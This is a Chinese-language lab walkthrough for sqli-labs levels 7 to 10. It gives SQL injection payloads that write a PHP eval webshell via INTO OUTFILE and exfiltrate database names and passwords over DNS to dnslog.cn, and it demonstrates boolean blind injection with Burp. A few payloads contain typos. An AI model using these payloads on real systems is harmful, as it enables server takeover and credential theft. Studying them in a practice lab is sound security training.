### 第七关

#### 法一写入一句换木马

源码

<?php  
//including the Mysql connect parameters.  
include("../sql-connections/sql-connect.php");  
error_reporting(0);  
// take the variables  
if(isset($_GET['id']))  
{  
$id=$_GET['id'];  
//logging the connection parameters to a file for analysis.  
$fp=fopen('result.txt','a');  
fwrite($fp,'ID:'.$id."\n");  
fclose($fp);  

// connectivity   

$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";  
$result=mysql_query($sql);  
$row = mysql_fetch_array($result);  

    if($row)  
    {  
    echo '<font color= "#FFFF00">';      
    echo 'You are in.... Use outfile......';  
    echo "<br>";  
    echo "</font>";  
    }  
    else   
{  
    echo '<font color= "#FFFF00">';  
    echo 'You have an error in your SQL syntax';  
    //print_r(mysql_error());  
    echo "</font>";    
    }  
}  
    else { echo "Please input the ID as parameter with numeric value";}  

?>

可以看出没有输出函数，报错注入也不行，因为//print_r(mysql_error());被注释掉了

##### 根据源码构造闭合

`$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";`

    ?id=1')) -- qwe

##### 爆字段

    ?id=1')) order by 4  -- qwe

##### 借助into outfile()函数

    ?id=-1')) union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "E:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\1.php" --+

    服务器路径C:\phpstudy_pro\WWW\sqli-labs-master\sqli-labs-master\Less-7

    ?id=-1')) union select 1,2'<?php @eval($_POST["cmd"]);?>' into outfile "C:\\\phpstudy_pro\\\WWW\\\sqli-labs-master\\\sqli-labs-master\\\Less-7\\\1.php" -- qwe

- ✅ MySQL用户具备`FILE`权限
- ✅ `secure_file_priv`值为空或包含目标路径
- ✅ Web目录可写且PHP解析正常
- ❗ 路径中不得存在中文或特殊字符

##### 使用蚁剑链接

#### 法二dns外带

##### 判断数字型还是字符型

?id=1/1
?id=1/0

##### 判断闭合方式

?id=1')) and 1=1 or(('
?id=1')) and 1=2 or(('

##### 爆出字段

?id=1')) order by 3--+

##### 爆出数据库

?id=1')) and (select load_file(concat('\\\\\\\\',(select database()),'.caqck1.dnslog.cn\\abc')))--+

##### 爆出数据库中表

?id=1')) and (select load_file(concat('\\\\\\\\',(select table_name from information_schema.tables where table_schema='security'),'.uaf91g.dnslog.cn\\abc')))--+

##### 获取表名

?id=1')) and (select load_file(concat('\\\\\\\\',(select concat(table_name) from information_schema.tables where table_schema='security' limit 1,1),'.y9yjr3.dnslog.cn\\abc')))--+

##### 获得表中数据

?id=1')) and (select load_file(concat('\\\\\\\',(select concat(password) from security.users limit 1,1),'.y9yjr3.dnslog.cn\\abc')))--+

### 第八关

burp抓包

- 本关要用到ascii加密，这里附上一张ascii表

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NWJmZWJiNzBmYzNkNDc2NDE1MzUzMTdhMDQ4MmQyM2NfcGNBN2d2VWd3ZUc4UjVTYWI1UktFU2ZISTZKSDljTW9fVG9rZW46TkxiU2JGcUdWb0E5NFF4VFhncmNNejB2bjk0XzE3NTM0NjUwMTA6MTc1MzQ2ODYxMF9WNA)

 查看源码

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MGFhZjcxNzdiMDk5OWYwY2U2ZTYyOTBkNzFlZjgxZDRfUWpDOXhvbVVFMjVoSHE2akN0N2ZtNklJYmpxMUt5ZkFfVG9rZW46VXlzYWJFZmZUbzBQNVR4OU1RY2NmdXZNbmplXzE3NTM0NjUwMTA6MTc1MzQ2ODYxMF9WNA)

会发现，从这里的echo没有输出任何有关于数据库的信息，也没有数据库报错函数，因此用不了报错注入，与联合注入

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=OTZkN2QxYmI1NGQ2NzgwMDlhYzQzODdlYWE0Mjc4MDVfTENqRmxqa2pLTjl6MDdHSktrc2ZuVFVZQ3plUG53dmRfVG9rZW46VFlsVWJMZjdub1UwU0t4RVlpUWNsV1pzbm5jXzE3NTM0NjUwMTA6MTc1MzQ2ODYxMF9WNA)![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MTFhMTBiMWQ1NjFmNThjN2IxOGE5MTNjZGI3MmNjODFfS24yRHloYW9LNG9XWlFYYmRUekh4N2o0UkphY2lacERfVG9rZW46TEcyaWJESjdub3BldDN4MzdsbGM1cjF4bjNnXzE3NTM0NjUwMTA6MTc1MzQ2ODYxMF9WNA)

- 这里可以尝试，时间盲注，bool盲注，或是dns外带，或者尝试植入一句话木马。

- 这里尝试bool盲注做演示
  
  - bool盲注特点，只有查寻成功，与错误两种变化，这种变化有时候会体现在返回字段按长度不同

- 观察注入点，以及闭合方式。

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NDQ1YjA5OTFlOTYwOGIxOTQ1MWU1ZTZkNzkzMjFiNDlfU1VPalVVUUwyV2g5SHZiN1YwRmt3aDBhSFdzQklhMjBfVG9rZW46T3dNNmJxQlVVb2w3em54ZFlJcmNrOVp5blpnXzE3NTM0NjUwMTA6MTc1MzQ2ODYxMF9WNA)

注入点为id参数，闭合只是简单的单引号闭合。

- burp抓包

```SQL
?id=1' and ascii(substr(database(),1,1))=115--+注意这里需要对数据进行加密，为了保护数据安全，一般会对数据进行保护，因此需要加密输出。语句的意思时数据库的第一个字母是不是ascii(115)对应字母s
```

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=YmFiMjdhNTFhZjk5ZWFiNmQyZWY5OTVjYzRkMmIzYWNfVjExTE55eEpCdWhYRHQ2TEk3c0dUdW5zZmZyUWNsc2lfVG9rZW46SnphR2JEam5Yb21scVp4S2NHeGNBaWROblpkXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NmRhNjQxYzA4OWZiYzllMDE1ZTdmN2QyYzc2MzhjMWZfRXlabzZaRElTVlpkR2xQaDdGdzhkbFhNZVc2Z0JjRERfVG9rZW46THVtRWJaRWl3b2R6RzB4Wm4zQmNhZ2JWbm1oXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

这里将变量从48一直替换递增到124进行爆破。

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=M2U5NjRiMTRhMmIwMDI2MmNkOTU3NTg1YmE4ZjBiNmJfMVNBeHU1ZnF6YzZyZkJsY1F5OU1pZ2FsZmRIdElzVmdfVG9rZW46SGpuVWI4Qjhib0hFOHZ4RmlVcGNzNlo1blplXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

从这里可以看出返回长度有两种结果，对应正确与错误的回显，显然正确的只有一个也就是长度为936的对应变量值为115也就是s字符。

因此我们构造的语句是正确的接下来只需要?id=1' and ascii(substr(database(),1,1))=115--+中substr(database(),1,1)的第一个1替换为2，3，4，5等等爆出剩下的字符

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=OGE0NDE0MjUwNjU1YTgzMWUxNzlkY2I3OGJhYjlhODdfZDJPU21VYnphZFBocGlnYjlTMXU1b2VOSWxmdTNuMHJfVG9rZW46RFY0NWJSV0s1bzFaZVF4UFBrbWNTMEJ3bmljXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=YTY5ZmE2MzkwMDAyMTIzZWIxOGIxZDQ0NWY1MmE2Y2VfVlp1OERhamFRT3NUUzVFT21xTmZoSXJ1TjBhT2dqaVVfVG9rZW46TXpDRGJxU0tlb1A4bWt4TEo2ZWNaSTRhbjFjXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjEyOTdkNzM3ZmEzODQyYTRlNDZlODM0NjU2ZWM3NThfR0ZGSWNhamxHTWxNbXpKd3BRMjc2M0lKWkVQRmkwT0dfVG9rZW46UHJsQ2J1bjBVbzhNTkV4S1ZaZ2MzNzhZbllkXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=OGJhYzlmODNlOTk1M2I0MTFjNDEwMjljNzIyZjZjY2RfUVY2aEg3bFRRZlRZVmJIcDdpdmtjQnpkd0xYamZBUG5fVG9rZW46SHhjN2JNUUp2b0pXZEF4ZlYwT2NCWVBNbjdnXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NzQ5ZTRmZWU2NDFlM2VmMzJjMzk5OTc4ZmY2NWZjNmZfcVhmVEdnVVRDcVppUnNDRkd0ajJzWVhaMFllNlpOd09fVG9rZW46SjkwUmI3WXJlb1pycVZ4bTZwTmN2ZzdIbkplXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=YTg4MTYyMGVjNDA1ZDE4NzBmMmE4OGYzNmMyOTEwNGFfSVZTa1lQWG9SdjVNWjdZYWtGVnZubXhhY3Q2dWIxMFBfVG9rZW46VkRuRGJsU2V1b0ZjQWl4THhoaWN2cmc1bkxmXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NTkwYzQwYmQ4ZGM1ZmM2ZTMwOTc5YmJlNDE4YzY4NWNfUFIydVdxYk5VSDVKMlVsTEhNWUhQMUdzeUptcWRWOGdfVG9rZW46WExlU2JOWTlibzM0djl4ZDgzc2MxWW91bnViXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

上面的数据依次是115 101 99 117 114 105 116 121对应字符s e c u r i t y

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NzA4MTMzMTYxZmQ1ZThiM2I1NjU5MDVhZmRmNDNjYjlfbEdFbU90WG5rbVZSUlRBSFY0MU9jZDRJUWQ5SmdqZDNfVG9rZW46SkVsbmIzOE9Tb2F2VmN4N2hKTWM4QWU4bkZnXzE3NTM0NjUwNzQ6MTc1MzQ2ODY3NF9WNA)

这里的数据长度都是一样的证明没有对的全是错误到，说明?id=1' and ascii(substr(database(),1,1))=115--+中substr(database(),1,1)的第一个1替换为2，3，4，5等等爆出剩下的字符替换到8就结束了，也就是数据库名长度为8。

```SQL
?id=1' and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),1,1))=115)--+按理来说应该是可以爆破出表名的呀，但我不知道为什么没有成功。感觉语句没毛并。这种方法很繁琐建议，一般都是配合自动化脚本使用
```

### 第九关

本关和less-8我感觉没什么不一样至少在源码中我没有看出

#### Into outfile

```SQL
?id=1' union select 1,2,'<?php @eval($_POST["cmd"]);?>' into outfile "E:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-9\\1.php" --+
```

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MTczNTc2MDZlYmVmMGQzZGI1NmZhMmUwYWZkYjZiNWJfcnR4dENyOXJySGN3cXhKSUZ3Mm9pcG1kVE55ZU1WbjhfVG9rZW46TnJMcWJNa2ZWb0RUeGN4ZzJhR2NDb3k5bnZkXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NGZiNWFkZWNkOWM5MmQzNTAzNWM3MjBmZDBjZDMxMDRfTllsOXFYWEY0WWJZNTcyR1FLZTRGcHZuOFlNUDFKVnBfVG9rZW46Q0VmYmJvZUpXb3ZJejd4NnhCZmN5Qm1qblpmXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

上传一句话木马成功

- 这里解决一个大家可能有的疑惑，就是为什么这里用联合查询为什么是select 1,2,3三个字段为什么不是select 1,2,3,4,5等等。也就是这里怎么确定是三个字段的？
  
  - 其实还是用到order by函数，在前几关时我们使用该函数order by 1等等是有一串明显的报错黄字告诉我们这个地方order by 3再往下查时没有东西了的报错了。
  
  - 在本关其实也是有的，只是比较隐晦也就是bool型，具体体现可能在各个地方，这里我就抓住了回显字节的不同。
  
  ![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQ0OTBmOTc2ZGU1MDVlMzVjNjQ1ZGQyYjg4MWRlNTJfbkdGVEVTdEgyd3BNRUw1ZFJEcEpZZEZOT3ZZM0pJVHpfVG9rZW46R1dXcGJQYlRLb0oxcmt4aFF6V2NDSEFIbm1oXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MGY5YWVjNTdiZmI0NWViNGFiZGY1ZjA1NjU2ZWEyOTlfMElNTVBmWWhvbUV0d1BjSnNhemIyUVQxR1oxUkgxQ3VfVG9rZW46WHphZWJNcjdmb0FQaU94WVdNYmNXMnJtbldiXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=MDdjODIzYjg5MWI0M2VlODlhZmY5ZDhmYzgzZDBlYzJfSml2QXNSeTlGSHM1YlZrSzNBSktaRldEdk5yWllRUXNfVG9rZW46TzFoYmJJaGVFb1RHTGN4bUhwT2NBOU8wbmJ3XzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=ODJiZGNhOTBmOTZmNzQ5NDI0YzkxNzhmN2FkMDY2ZjRfRWtqdGhMNTZDelpuS1pZYnZreUd2ZWxNTWVJazl6SEJfVG9rZW46WklubGJ4Rk1pb0gwOHh4dGVRT2NlWVUybkdlXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

从这里可以看出当order by 3与order by 4之间是存在一个质的飞跃的。这里可以判断出字段数为三方便后续的联合查询注入。

#### load file()dns外带

```SQL
与第八关无异?id=1' and (select load_file(concat('\\\\',(select database()),'.l1gbnm.dnslog.cn\\abc')))--+
```

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=NDljYmI4YjEzYTAzOWEyOGRiNjdkOGFlMzQ0OTA2YTFfWTViMG1sWW1UZU5HdXNrOFJDMDF5elRhTE9HdFBybTZfVG9rZW46Tkh6N2I3V3dHb281bm54M0Z5N2NvdHBMbkxmXzE3NTM0NjUyNzc6MTc1MzQ2ODg3N19WNA)

成功

burp逐字爆破也是没问题的和上一关真没看出什么区别

### 第十关

直接看源码吧：

![](https://ebmojslfyh.feishu.cn/space/api/box/stream/download/asynccode/?code=OWI0MDM2NjFlYzhmMDE4OTZjMDg3OThhYWU3ZjE0MmNfMEp2MkxXR2dHOVBXUHlEMmVOMUd0RHBTSEZZTXJLTERfVG9rZW46RmlYRmJJTUExb1B4VnV4eWRkTWNDRzlQblFnXzE3NTM0NjU0MDI6MTc1MzQ2OTAwMl9WNA)

直接看$sql会以为这是数字型注入，因为语句中并没有为$id加上闭合。

但是这里发现在参数传入select语句时会提前对$id参数进行一个包装给它拼接了两个" ",这其实是间接给$sql语句中的$id参数拼接了一对""也就是

```SQL
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";这两句加起来等于下面$sql="SELECT * FROM users WHERE id="$id" LIMIT 0,1";
```

剩下的和上几关并没有什么区别这里就不演示了。

```SQL
?id=1" order by 1--+
?id=1" union select 1,2,'<?php @eval($_post["cmd"]);?>' into outfile "E:\\phpstudy\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-10\\xx.php" --+
```
